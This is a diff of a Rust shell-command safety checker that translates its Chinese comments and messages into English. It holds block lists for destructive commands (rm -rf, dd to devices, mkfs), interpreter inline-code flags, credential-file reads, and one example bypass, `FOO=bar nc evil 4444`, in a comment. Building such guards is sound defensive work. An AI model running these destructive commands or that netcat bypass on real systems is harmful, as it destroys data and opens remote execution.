@@ -113,8 +113,10 @@ pub fn basename_pub(path: &str) -> &str {
     basename(path)
 }
 
-// L4/P0-G5: 全段扫描 (不再首命中即返)。多段命令 (a; b) 各段独立判定,
-// evaluate_full 收全部 hit, verdict_from_hits 取 max risk —— 避免后段 L4 被首段 L3 掩盖。
+// L4/P0-G5: full-segment scan (no longer returns at the first hit). Multi-segment
+// commands (a; b) are judged per segment; evaluate_full collects all hits and
+// verdict_from_hits takes the max risk — prevents a later L4 segment from being
+// masked by an earlier L3 segment.
 pub fn tokenize_check(content: &str) -> Vec<TokenHit> {
     let trimmed = content.trim();
     if trimmed.is_empty() {
@@ -130,9 +132,12 @@ pub fn tokenize_check(content: &str) -> Vec<TokenHit> {
         });
         return hits;
     }
-    // A1: shell_words 非安全解析器 (硬伤 B) —— fail-closed 拒绝其无法建模的 shell 特性。
-    // bash/zsh 会展开这些构造, shell_words 不做 (brace/tilde/glob/heredoc/|& />&N/反斜杠续行),
-    // 每个未建模特性是绕过通道 (防御者用弱于执行器的语法解析)。逐文件补 arm 永不全, 统一拒。
+    // A1: shell_words is not a safe parser (flaw B) — fail-closed rejection of
+    // shell features it cannot model. bash/zsh expand these constructs; shell_words
+    // does not (brace/tilde/glob/heredoc/|& />&N/backslash line continuation).
+    // Every unmodeled feature is a bypass channel (the defender parses with
+    // weaker syntax than the executor). Adding arms one by one can never be
+    // complete; reject uniformly.
     if let Some(reason) = check_unmodeled_shell_features(trimmed) {
         hits.push(TokenHit {
             binary: String::new(),
@@ -154,9 +159,11 @@ pub fn tokenize_check(content: &str) -> Vec<TokenHit> {
     hits
 }
 
-// A1 fail-closed: 引号感知扫描 shell_words 无法建模的 shell 特性。
-// 仅扫未引号区域 (单/双引号内 glob/brace 是字面量, shell 不展开)。
-// 命中即 Block L4 (sensitive_target=true) —— 零信任契约: 未知语法不可证明安全 = 拒。
+// A1 fail-closed: quote-aware scan for shell features shell_words cannot model.
+// Only unquoted regions are scanned (globs/braces inside single/double quotes
+// are literals; the shell does not expand them).
+// A hit means Block L4 (sensitive_target=true) — zero-trust contract: unknown
+// syntax that cannot be proven safe = reject.
 fn check_unmodeled_shell_features(command: &str) -> Option<String> {
     let mut in_single = false;
     let mut in_double = false;
@@ -177,59 +184,78 @@ fn check_unmodeled_shell_features(command: &str) -> Option<String> {
         match ch {
             '\'' => in_single = true,
             '"' => in_double = true,
-            // brace 展开 {a,b} 或 {n..m} —— shell_words 不建模, bash 展开为多 argv。
-            // 单 {} 是 find -exec 占位符非 shell 展开, 不拒 (避免 find -exec 假阳性)。
-            // 仅匹配带逗号或 .. 范围的真 brace expansion。
+            // brace expansion {a,b} or {n..m} — shell_words does not model it; bash expands it into multiple argv.
+            // A bare {} is the find -exec placeholder, not a shell expansion; do not reject
+            // (avoids find -exec false positives).
+            // Only match real brace expansions containing a comma or a .. range.
             '{' => {
                 let rest = &command[ch.len_utf8()..];
                 if let Some(close) = rest.find('}') {
                     let inner = &rest[..close];
                     if inner.contains(',') || inner.contains("..") {
                         return Some(
-                            "禁止 brace 展开 {a,b}/{n..m} (shell_words 未建模, A1 fail-closed)"
+                            "brace expansion {a,b}/{n..m} rejected (shell_words cannot model it, A1 fail-closed)"
                                 .into(),
                         );
                     }
                 }
             }
-            // heredoc << / <<- —— shell_words 当重定向误析, shell 读多行字面量。
+            // heredoc << / <<- — shell_words mis-parses it as a redirect; the shell reads a multi-line literal.
             '<' if chars.peek() == Some(&'<') => {
-                return Some("禁止 heredoc <<EOF (shell_words 未建模, A1 fail-closed)".into());
+                return Some(
+                    "heredoc <<EOF rejected (shell_words cannot model it, A1 fail-closed)".into(),
+                );
             }
-            // |& —— bash 管道 + stderr 合并, shell_words 当 | + & 分裂。
+            // |& — bash pipe + stderr merge; shell_words splits it as | + &.
             '|' if chars.peek() == Some(&'&') => {
-                return Some("禁止 |& 管道 (shell_words 未建模, A1 fail-closed)".into());
+                return Some(
+                    "|& pipe rejected (shell_words cannot model it, A1 fail-closed)".into(),
+                );
             }
-            // >&N / <&N fd 重定向 —— shell_words 不建模 fd dup。
+            // >&N / <&N fd redirection — shell_words does not model fd duplication.
             '>' if chars.peek() == Some(&'&') => {
-                return Some("禁止 >&N fd 重定向 (shell_words 未建模, A1 fail-closed)".into());
+                return Some(
+                    ">&N fd redirection rejected (shell_words cannot model it, A1 fail-closed)"
+                        .into(),
+                );
             }
             '<' if chars.peek() == Some(&'&') => {
-                return Some("禁止 <&N fd 重定向 (shell_words 未建模, A1 fail-closed)".into());
+                return Some(
+                    "<&N fd redirection rejected (shell_words cannot model it, A1 fail-closed)"
+                        .into(),
+                );
             }
-            // <> 读写打开 —— shell_words 未建模。
+            // <> read-write open — not modeled by shell_words.
             '<' if chars.peek() == Some(&'>') => {
-                return Some("禁止 <> 读写打开 (shell_words 未建模, A1 fail-closed)".into());
+                return Some(
+                    "<> read-write open rejected (shell_words cannot model it, A1 fail-closed)"
+                        .into(),
+                );
             }
-            // 反斜杠续行 \ + 换行 —— shell 跨行拼接 argv, shell_words 分裂。
+            // backslash line continuation \ + newline — the shell joins argv across lines; shell_words splits.
             '\\' if chars.peek() == Some(&'\n') => {
-                return Some("禁止反斜杠续行 (shell_words 未建模, A1 fail-closed)".into());
+                return Some("backslash line continuation rejected (shell_words cannot model it, A1 fail-closed)".into());
             }
-            // glob * ? [...] —— shell_words 当字面量, shell 展开为多文件 argv。
-            // 仅扫未引号区域的裸 glob (路径内通配也算展开, shell 会 glob)。
+            // glob * ? [...] — shell_words treats them as literals; the shell expands them into multi-file argv.
+            // Only bare globs in unquoted regions are scanned (wildcards inside paths also expand; the shell globs them).
             '*' | '?' => {
                 return Some(format!(
-                    "禁止 glob '{}' (shell_words 未建模, A1 fail-closed)",
+                    "glob '{}' rejected (shell_words cannot model it, A1 fail-closed)",
                     ch
                 ));
             }
             '[' if command[ch.len_utf8()..].contains(']') => {
-                return Some("禁止 glob [...] (shell_words 未建模, A1 fail-closed)".into());
+                return Some(
+                    "glob [...] rejected (shell_words cannot model it, A1 fail-closed)".into(),
+                );
             }
-            // tilde 展开 ~/ 或 裸 ~ —— shell_words 当字面量, shell 展开为 $HOME。
-            // 仅独立词首 ~ (如 cd ~/secret), 非路径中段 (foo~bar 不展开)。
+            // tilde expansion ~/ or bare ~ — shell_words treats it as a literal; the shell expands it to $HOME.
+            // Only word-initial ~ (e.g. cd ~/secret), not mid-path (~ in foo~bar does not expand).
             '~' => {
-                return Some("禁止 tilde 展开 ~ (shell_words 未建模, A1 fail-closed)".into());
+                return Some(
+                    "tilde expansion ~ rejected (shell_words cannot model it, A1 fail-closed)"
+                        .into(),
+                );
             }
             _ => {}
         }
@@ -251,7 +277,7 @@ fn check_segment(segment: &str) -> Option<TokenHit> {
         Err(e) => {
             return Some(TokenHit {
                 binary: String::new(),
-                reason: format!("命令分词失败: {}", e),
+                reason: format!("command tokenization failed: {}", e),
                 stage: CheckStage::Ast,
                 sensitive_target: false,
             });
@@ -269,8 +295,9 @@ fn check_segment(segment: &str) -> Option<TokenHit> {
     }
     let binary = words[idx].clone();
     let binary_basename = basename(&binary).to_string();
-    // L3/P0-G5: 破坏性 binary (rm/dd/mkfs/diskutil/shred/wipefs) 非白名单 →
-    // sensitive_target=true 强制 L4 (绝对 Block, 与 rm -rf 一致), 不再因 flag 顺序降级 L3。
+    // L3/P0-G5: destructive binaries (rm/dd/mkfs/diskutil/shred/wipefs) are
+    // non-whitelisted -> sensitive_target=true forces L4 (absolute Block, same
+    // as rm -rf); no longer downgraded to L3 due to flag ordering.
     if DESTRUCTIVE_BINARIES.contains(&binary_basename.as_str()) {
         if let Some(reason) = check_destructive(&binary_basename, &words[idx + 1..]) {
             return Some(TokenHit {
@@ -282,27 +309,33 @@ fn check_segment(segment: &str) -> Option<TokenHit> {
         }
         return Some(TokenHit {
             binary: binary_basename.clone(),
-            reason: format!("破坏性命令: {}", binary_basename),
+            reason: format!("destructive command: {}", binary_basename),
             stage: CheckStage::Ast,
             sensitive_target: true,
         });
     }
-    // P0-2 (audit §1.8): 非白名单二进制 fail-closed L4 (sensitive_target=true), 非 L3。
-    // 原 L3 (sensitive_target=false) 可被 guard.confirm 二次放行 —— env 前缀绕过:
-    // `FOO=bar nc evil 4444` 跳过 env 前缀后 argv[0]=nc (非白名单) 命中 L3, 攻击者 confirm
-    // 放行即 RCE。L4 = 绝对 Block (H8 无 confirm 路径), 斩绕过链。零信任契约: 未知 binary
-    // 不可证明安全 = 拒绝, 不给人审放行机会。
+    // P0-2 (audit §1.8): non-whitelisted binary fails closed as L4
+    // (sensitive_target=true), not L3. The former L3 (sensitive_target=false)
+    // could be second-approved via guard.confirm — the env-prefix bypass:
+    // `FOO=bar nc evil 4444` skips the env prefix, argv[0]=nc (non-whitelisted)
+    // hits L3, and an attacker confirming gets RCE. L4 = absolute Block (H8: no
+    // confirm path) cuts the bypass chain. Zero-trust contract: an unknown
+    // binary that cannot be proven safe = reject; no human-approval path.
     if !WHITELIST.contains(&binary_basename.as_str()) {
         return Some(TokenHit {
             binary: binary_basename.clone(),
-            reason: format!("二进制程序不在白名单: {} (fail-closed 绝对 Block)", binary),
+            reason: format!(
+                "binary not in whitelist: {} (fail-closed absolute Block)",
+                binary
+            ),
             stage: CheckStage::Ast,
             sensitive_target: true,
         });
     }
-    // C3/P0-G5: 白名单内任意代码解释器 (python/node/bun/deno/cargo/go/swift)
-    // 检测 -c/-e/-m/--eval/--command/-x/run/script 等内联代码 flag → L4 Block
-    // (解释器内代码递归不可解析, 零信任契约: 任意代码执行 = 绝对 Block)。
+    // C3/P0-G5: any whitelisted code interpreter (python/node/bun/deno/cargo/go/swift)
+    // with inline-code flags such as -c/-e/-m/--eval/--command/-x/run/script -> L4 Block
+    // (interpreter-internal code cannot be parsed recursively; zero-trust contract:
+    // arbitrary code execution = absolute Block).
     if INTERPRETER_BINARIES.contains(&binary_basename.as_str()) {
         if let Some(reason) = check_interpreter(&binary_basename, &words[idx + 1..]) {
             return Some(TokenHit {
@@ -353,28 +386,33 @@ const INTERPRETER_BINARIES: &[&str] = &[
     "osascript",
 ];
 
-// C3: 解释器内联代码 flag 集合。命中即任意 RCE → L4。
-// 不含 -m/--print 等非代码 flag 以免误杀 (python -m pip)。仅代码注入 flag。
+// C3: interpreter inline-code flag set. A hit means arbitrary RCE -> L4.
+// Non-code flags like -m/--print are excluded to avoid false kills (python -m pip).
+// Code-injection flags only.
 const INTERPRETER_CODE_FLAGS: &[&str] = &["-c", "-e", "-x", "--eval", "--command"];
 
-// C3: 解释器代码子命令 (deno eval/run, bun run)。命中即任意 RCE → L4。
+// C3: interpreter code subcommands (deno eval/run, bun run). A hit means arbitrary RCE -> L4.
 const INTERPRETER_CODE_SUBCMD: &[&str] = &["eval", "run", "exec"];
 
-// C3: 识别解释器执行内联代码的意图 (递归不可解析 → L4 绝对 Block)。
-// 仅拦截明确代码注入 flag (-c/-e/--eval/--command) 与代码子命令 (eval/run/exec)。
-// 不拦截无 flag 脚本路径 (python script.py) —— cargo build 类合法构建会被误杀,
-// 零信任契约核心是内联代码 (零开销递归执行任意串), 显式 flag 已覆盖最致命路径。
+// C3: detect the intent of an interpreter executing inline code (cannot be
+// parsed recursively -> L4 absolute Block).
+// Only explicit code-injection flags (-c/-e/--eval/--command) and code
+// subcommands (eval/run/exec) are intercepted.
+// Script paths without flags (python script.py) are not intercepted — legal
+// builds like cargo build would be false-killed. The core of the zero-trust
+// contract is inline code (zero-cost recursive execution of arbitrary strings);
+// explicit flags already cover the most lethal paths.
 fn check_interpreter(binary: &str, args: &[String]) -> Option<String> {
     for (i, a) in args.iter().enumerate() {
         if INTERPRETER_CODE_FLAGS.contains(&a.as_str()) {
             return Some(format!(
-                "{} {} 内联代码执行 (任意 RCE, 递归不可解析 → 绝对 Block)",
+                "{} {} inline code execution (arbitrary RCE, cannot parse recursively -> absolute Block)",
                 binary, a
             ));
         }
         if INTERPRETER_CODE_SUBCMD.contains(&a.as_str()) && i + 1 < args.len() {
             return Some(format!(
-                "{} {} <script> 任意代码执行 → 绝对 Block",
+                "{} {} <script> arbitrary code execution -> absolute Block",
                 binary, a
             ));
         }
@@ -382,13 +420,17 @@ fn check_interpreter(binary: &str, args: &[String]) -> Option<String> {
     None
 }
 
-// L3+L4/P0-G5: 破坏性命令 arm。dd of=/dev/* → L4; rm 递归 flag 变体统一 L4。
+// L3+L4/P0-G5: destructive command arms. dd of=/dev/* -> L4; rm recursive flag
+// variants uniformly L4.
 fn check_destructive(binary: &str, args: &[String]) -> Option<String> {
     if binary == "dd" {
         for a in args {
             if let Some(target) = a.strip_prefix("of=") {
                 if is_sensitive_path(target) || target.starts_with("/dev/") {
-                    return Some(format!("dd of={} 磁盘/敏感设备写入 → 绝对 Block", target));
+                    return Some(format!(
+                        "dd of={} writes to disk/sensitive device -> absolute Block",
+                        target
+                    ));
                 }
             }
         }
@@ -399,10 +441,13 @@ fn check_destructive(binary: &str, args: &[String]) -> Option<String> {
         let has_recursive = combined.contains("-r") || combined.contains("--recursive");
         let has_force = combined.contains("-f") || combined.contains("--force");
         if has_recursive && has_force {
-            return Some("rm 递归+强制 (-rf/-fr/--recursive --force 变体) → 绝对 Block".into());
+            return Some(
+                "rm recursive+force (-rf/-fr/--recursive --force variants) -> absolute Block"
+                    .into(),
+            );
         }
         if has_recursive {
-            return Some("rm 递归删除 (-r/--recursive) → 绝对 Block".into());
+            return Some("rm recursive delete (-r/--recursive) -> absolute Block".into());
         }
         return None;
     }
@@ -410,28 +455,37 @@ fn check_destructive(binary: &str, args: &[String]) -> Option<String> {
         binary,
         "mkfs" | "diskutil" | "shred" | "wipefs" | "fdisk" | "parted"
     ) {
-        return Some(format!("{} 磁盘/分区破坏性操作 → 绝对 Block", binary));
+        return Some(format!(
+            "{} destructive disk/partition operation -> absolute Block",
+            binary
+        ));
     }
     None
 }
 
 fn check_argv(binary: &str, args: &[String]) -> Option<String> {
     match binary {
-        // L5: mv/cp 目的地解析须建模 -t DIR / --target-directory=DIR / --target-directory DIR / -- 终止符。
-        // 原实现 args.rev().find(!starts_with('-')) 只取最后非 flag arg —— 漏 -t DIR 形式
-        // (`mv -t /etc f` 最后非 flag 是 f 非 /etc) 且误把 -- 后 source 当 dest。
-        // GNU mv: dest = -t/--target-directory 显式指定; 否则最后位置参数 (跳 flag + -- 后全位置)。
+        // L5: mv/cp destination parsing must model -t DIR / --target-directory=DIR /
+        // --target-directory DIR / the -- terminator.
+        // The old args.rev().find(!starts_with('-')) took only the last non-flag arg —
+        // it missed the -t DIR form (`mv -t /etc f`: last non-flag is f, not /etc) and
+        // mistook a source after -- for the dest.
+        // GNU mv: dest = explicit -t/--target-directory; otherwise the last positional
+        // (skipping flags + everything after -- is positional).
         "mv" | "cp" => {
             if let Some(dest) = parse_mv_cp_dest(args) {
                 if is_sensitive_path(&dest) {
-                    return Some(format!("{} 目的地位于敏感路径: {}", binary, dest));
+                    return Some(format!(
+                        "{} destination is in a sensitive path: {}",
+                        binary, dest
+                    ));
                 }
             }
             None
         }
         "sed" => {
             if args.iter().any(|a| a == "-i" || a.starts_with("-i")) {
-                return Some("禁止 sed -i 原地编辑".into());
+                return Some("sed -i in-place editing rejected".into());
             }
             None
         }
@@ -440,7 +494,9 @@ fn check_argv(binary: &str, args: &[String]) -> Option<String> {
                 .iter()
                 .any(|a| a == "-exec" || a == "-execdir" || a == "-ok" || a == "-delete")
             {
-                return Some("禁止 find -exec/-execdir/-ok/-delete 任意命令执行".into());
+                return Some(
+                    "find -exec/-execdir/-ok/-delete arbitrary command execution rejected".into(),
+                );
             }
             None
         }
@@ -450,7 +506,7 @@ fn check_argv(binary: &str, args: &[String]) -> Option<String> {
                     continue;
                 }
                 if is_sensitive_path(a) {
-                    return Some(format!("{} 敏感路径: {}", binary, a));
+                    return Some(format!("{} sensitive path: {}", binary, a));
                 }
             }
             None
@@ -462,18 +518,24 @@ fn check_argv(binary: &str, args: &[String]) -> Option<String> {
                 }
                 if is_sensitive_path(a) {
                     return Some(format!(
-                        "{} 读源位于敏感路径: {} (禁止读取私钥/系统文件)",
+                        "{} read source is in a sensitive path: {} (private key/system file reads rejected)",
                         binary, a
                     ));
                 }
                 if is_sensitive_filename(a) {
-                    return Some(format!("{} 读源为凭据文件 (敏感文件名模式): {}", binary, a));
+                    return Some(format!(
+                        "{} read source is a credential file (sensitive filename pattern): {}",
+                        binary, a
+                    ));
                 }
                 if std::path::Path::new(a)
                     .components()
                     .any(|comp| comp == std::path::Component::ParentDir)
                 {
-                    return Some(format!("{} 路径含 .. 组件, 拒绝逃逸嫌疑: {}", binary, a));
+                    return Some(format!(
+                        "{} path contains a .. component, suspected escape rejected: {}",
+                        binary, a
+                    ));
                 }
             }
             None
@@ -481,13 +543,13 @@ fn check_argv(binary: &str, args: &[String]) -> Option<String> {
         "git" => {
             for a in args.iter() {
                 if a == "config" {
-                    return Some("禁止 git config 持久配置后门".into());
+                    return Some("git config persistent configuration backdoor rejected".into());
                 }
                 if a == "-c" {
-                    return Some("禁止 git -c 临时配置注入".into());
+                    return Some("git -c temporary configuration injection rejected".into());
                 }
                 if a.starts_with("alias.") || a.starts_with("core.") {
-                    return Some("禁止 git config alias/core 持久后门".into());
+                    return Some("git config alias/core persistent backdoor rejected".into());
                 }
             }
             None
@@ -496,11 +558,12 @@ fn check_argv(binary: &str, args: &[String]) -> Option<String> {
     }
 }
 
-// L5: GNU mv/cp 目的地解析。优先级:
-//   1. -t DIR / --target-directory DIR / --target-directory=DIR (显式指定, 短长两种接法)
-//   2. 否则最后位置参数 (跳 flag 值 + -- 终止符后全位置参数)
-// 返 None: 仅 source 无 dest (mv 单参, 非法命令) 或无位置参数。
-// GNU 语义: -t 与最后位置参数冲突时 -t 优先 (显式 > 隐式); 多 -t 取最后 (覆盖)。
+// L5: GNU mv/cp destination parsing. Priority:
+//   1. -t DIR / --target-directory DIR / --target-directory=DIR (explicit; short and long forms)
+//   2. Otherwise the last positional arg (skipping flag values; after the -- terminator all are positional)
+// Returns None: only a source without a dest (single-arg mv, illegal command) or no positionals.
+// GNU semantics: when -t conflicts with the last positional, -t wins (explicit > implicit);
+// multiple -t takes the last (override).
 fn parse_mv_cp_dest(args: &[String]) -> Option<String> {
     let mut explicit_dest: Option<String> = None;
     let mut positionals: Vec<String> = Vec::new();
@@ -568,7 +631,8 @@ fn parse_mv_cp_dest(args: &[String]) -> Option<String> {
 }
 
 fn check_redirect_target(segment: &str) -> Option<String> {
-    // P1: OnceLock 缓存重定向正则, 非每次 Regex::new (热路径 tokenize_check 每段都编译)。
+    // P1: OnceLock caches the redirect regex instead of Regex::new per call
+    // (the hot path tokenize_check compiled it for every segment).
     use std::sync::OnceLock;
     static RE: OnceLock<regex::Regex> = OnceLock::new();
     let re =
@@ -576,7 +640,10 @@ fn check_redirect_target(segment: &str) -> Option<String> {
     for cap in re.captures_iter(segment) {
         if let Some(target) = cap.get(1) {
             if is_sensitive_path(target.as_str()) {
-                return Some(format!("重定向目标位于敏感路径: {}", target.as_str()));
+                return Some(format!(
+                    "redirect target is in a sensitive path: {}",
+                    target.as_str()
+                ));
             }
         }
     }
@@ -613,10 +680,10 @@ pub fn is_sensitive_filename(path: &str) -> bool {
 
 fn check_shell_substitution(command: &str) -> Option<String> {
     if command.contains("$(") || command.contains('`') {
-        return Some("禁止命令替换 $(...)/反引号".into());
+        return Some("command substitution $(...)/backticks rejected".into());
     }
     if command.contains("<(") || command.contains("<<<") {
-        return Some("禁止进程替换 <(...)/<<<".into());
+        return Some("process substitution <(...)/<<< rejected".into());
     }
     None
 }
